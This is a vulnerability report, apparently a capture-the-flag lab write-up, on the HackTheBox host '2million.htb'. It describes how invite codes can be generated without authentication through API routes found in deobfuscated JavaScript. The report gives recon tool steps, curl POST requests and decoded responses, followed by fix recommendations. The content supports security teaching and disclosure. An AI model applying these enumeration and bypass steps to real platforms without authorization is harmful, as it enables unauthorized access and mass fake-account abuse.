## Summary
A Logic Flaw in the invite-generation API allows attackers to generate and validate invite codes without authorization by directly calling backend endpoints exposed through JavaScript.

---

## Description 
The vulnerability exists due to a logic flaw in the invite‑generation mechanism, where critical backend API endpoints are exposed directly within client‑side JavaScript files. These endpoints — responsible for generating and verifying invite codes — are not properly protected and do not require authentication or authorization.

During analysis of the website’s JavaScript files, functions responsible for generating and verifying invite codes were discovered. After deobfuscation, the code revealed hardcoded API paths such as:
/api/v1/invite/generate
/api/v1/invite/verify
/api/v1/invite/how/to/generate
/api/v1/invite/how/to/verifyssss

Instead of being restricted to server‑side logic, these endpoints could be called directly by any external user, allowing an attacker to fully bypass the intended invitation workflow.

The application trusts any caller and accepts arbitrary values for the “code” parameter. Sending a POST request to /api/v1/invite/generate returns an encoded invite code (Base64/ROT13), which can then be decoded and submitted for verification. This essentially allows an attacker to generate valid invite codes without needing any internal logic or permission.

This flaw breaks the intended access‑control design and exposes internal functionality that should only be reachable through the platform’s controlled workflow.

---

## Steps to Reproduce
1.Enumerated all accessible URLs using Katana, Wayback, and GoSpider, then consolidated the output into a single file.

2.Extracted all JavaScript endpoints from the collected URLs and stored them separately in java.txt.

3.Identified and manually reviewed a key script at: http://2million.htb/js/inviteapi.min.js

4.Deobfuscated the Obfuscated JavaScript, revealing two internal functions that exposed hidden API routes:
          verifyInviteCode(code) → /api/v1/invite/verify
          makeInviteCode() → /api/v1/invite/how/to/generate
          
5.Retrieved the undocumented API paths directly from the deobfuscated source.

6.Sent a POST request to the generation endpoint, which returned an encoded message.

7.Decoded the response (ROT13), revealing the correct invite‑generation URL.

8.Called the resolved endpoint, which returned an encoded invite code.

9.Decoded the invite code and obtained a valid invitation key without any form of authentication or access control.


### Request:
```
curl -X POST http://2million.htb/api/v1/invite/how/to/generate \
     -H "Content-Type: application/json" \
     -d '{"code":"MYTESTCODE"}'
     
__________________________
curl -X POST http://2million.htb/api/v1/invite/how/to/verify \
     -H "Content-Type: application/json" \
     -d '{"code":"MYTESTCODE"}'
     
__________________________
curl -X POST http://2million.htb/api/v1/invite/generate \ 
     -H "Content-Type: application/json" \
     -d '{"code":"MYTESTCODE"}'
```


### Response:
```
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}

__________________________
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>

__________________________
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "WkRJMlAtSk5LMlotN0xEWFgtMTQzUVU=",
    "format": "encoded"
  }
}
```


---

## Impact
The vulnerability allows anyone to access hidden invite‑generation APIs and create unlimited valid invite codes without authentication. This completely bypasses the platform’s invitation system and enables mass fake account creation and automated abuse.

---

## Affected Endpoint(s)
- [/api/v1/invite/how/to/generate]
- [/api/v1/invite/how/to/verify]
- [/api/v1/invite/generate]

---

## Recommendation (Fix)
-Restrict access to all invite‑related API endpoints by requiring proper authentication and authorization.

-Avoid exposing internal API routes inside client‑side JavaScript files.

-Implement server‑side validation to ensure that invite generation cannot occur without a valid, authenticated session.

-Remove or obfuscate sensitive logic from public JavaScript and avoid returning encoded hints that can be easily decoded.

-Monitor and rate‑limit requests to prevent automated enumeration or abuse.

---


## Severity
[Medium] 

Reason: The vulnerability allows unauthenticated users to access internal invite‑generation APIs and obtain valid invite codes. While it does not directly expose sensitive user data or compromise accounts, it bypasses intended access controls and enables unauthorized platform access, which impacts platform integrity and onboarding restrictions.

---

## Reporter
Name: khaled waled

Handle(github): khaledvvaled

